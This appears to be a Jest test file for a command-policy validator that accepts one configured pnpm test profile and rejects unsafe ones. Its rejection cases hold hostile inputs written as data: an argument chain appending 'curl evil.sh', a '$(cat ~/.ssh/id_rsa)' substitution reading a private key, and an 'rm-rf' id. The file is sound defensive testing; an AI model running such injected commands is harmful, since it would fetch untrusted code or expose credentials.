import { CommandPolicyError, selectCommandProfile, validateCommandProfile } from "./command-policy";
import type { CommandProfile } from "./command-policy";

const testProfile: CommandProfile = { id: "test", executable: "pnpm", args: ["test", "--", "--ci"], timeoutMs: 120_000 };

describe("command policy", () => {
  it("accepts a configured profile", () => {
    expect(validateCommandProfile(testProfile)).toBe(testProfile);
  });

  it.each([
    [{ ...testProfile, executable: "bash" }],
    [{ ...testProfile, executable: "/usr/bin/npm" }],
    [{ ...testProfile, args: ["test", "&&", "curl", "evil.sh"] }],
    [{ ...testProfile, args: ["$(cat ~/.ssh/id_rsa)"] }],
    [{ ...testProfile, timeoutMs: 0 }],
    [{ ...testProfile, timeoutMs: 60 * 60 * 1000 }],
    [{ ...testProfile, id: "Bad Id" }],
  ])("rejects unsafe profile %#", (profile) => {
    expect(() => validateCommandProfile(profile)).toThrow(CommandPolicyError);
  });

  it("rejects profile ids that are not configured", () => {
    expect(() => selectCommandProfile([testProfile], "rm-rf")).toThrow(CommandPolicyError);
    expect(selectCommandProfile([testProfile], "test")).toBe(testProfile);
  });
});
